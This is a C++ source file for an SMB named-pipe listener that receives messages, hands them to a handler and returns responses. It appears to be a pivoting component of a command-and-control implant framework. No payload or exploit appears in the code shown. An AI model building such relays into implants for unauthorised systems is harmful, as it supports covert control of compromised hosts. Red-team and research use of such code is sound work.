#include "ListenerSmb.hpp"


using namespace std;


ListenerSmb::ListenerSmb(const std::string& pipeName)
	: Listener(pipeName, "", ListenerSmbType)
{
	m_listenerHash = random_string(SizeListenerHash);
	m_listenerHash += '\x60';
	m_listenerHash += ListenerSmbType;
	m_listenerHash += '\x60';
	m_listenerHash += m_hostname;
	m_listenerHash += "->";
	m_listenerHash += pipeName;

	m_serverSmb = new PipeHandler::Server(pipeName);

	m_stopThread=false;
	m_smbServ = std::make_unique<std::thread>(&ListenerSmb::lauchSmbServ, this);
}


ListenerSmb::~ListenerSmb()
{
	m_stopThread=true;
	m_smbServ->join();

	delete m_serverSmb;
}


void ListenerSmb::lauchSmbServ()
{
	try 
    {
		while(1)
		{
			if(m_stopThread)
				return;

			m_serverSmb->initServer();

			DEBUG("receiving");
	
			bool res = false;
			string input;
			while(input.empty())
			{
				res = m_serverSmb->receiveData(input);
				std::this_thread::sleep_for(std::chrono::milliseconds(50));		
			}

			DEBUG("received input.size " << std::to_string(input.size()));

			if(res && !input.empty())
			{
				string output;
				bool ret = handleMessages(input, output);

				DEBUG("sending output.size " << std::to_string(output.size()));

				res = m_serverSmb->sendData(output);	
				if(res)
				{
					DEBUG("sent");
				}
			}
		}
	}
    catch (...)
    {
        return;
    }

	return;
}

